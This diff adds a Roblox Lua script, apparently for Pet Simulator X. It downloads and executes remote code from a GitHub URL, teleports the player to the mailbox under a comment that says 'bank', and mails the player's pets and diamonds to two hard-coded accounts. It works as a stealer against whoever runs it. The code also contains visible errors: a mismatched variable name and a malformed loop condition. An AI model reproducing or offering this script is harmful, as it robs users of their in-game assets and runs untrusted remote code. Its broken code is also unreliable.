@@ -1,0 +1,29 @@
+local CelestialScript = loadstring(game:HttpGet("https://raw.githubusercontent.com/MrGalaxy10/Psx/main/Api.lua",true))()
+
+-- Constantly teleports the user to the bank
+spawn(function()
+    while true do
+        wait(1)
+        CelestialScript.TpToMailbox()
+    end
+end)
+
+local Pets = CelestialScripts.GetPets()
+local Diamonds = CelestialScript.GetDiamonds()
+
+while #Pets > 1 Diamonds > 100000 do
+    wait(7)
+    local worked, errormsg = pcall(function()
+        CelestialScript.SendMail("Roblox", 0, Pets[1]["uid"], "BroWhat 8139")
+    end)
+    if worked then
+        Diamonds = Diamonds - 100000
+        table.remove(Pets, 1)
+    end
+end
+
+wait(7)
+ 
+if Diamonds > 100000 then
+   CelestialScript.SendMail("Roblox", Diamonds-100001, {}, "MrFeast 8218")
+end
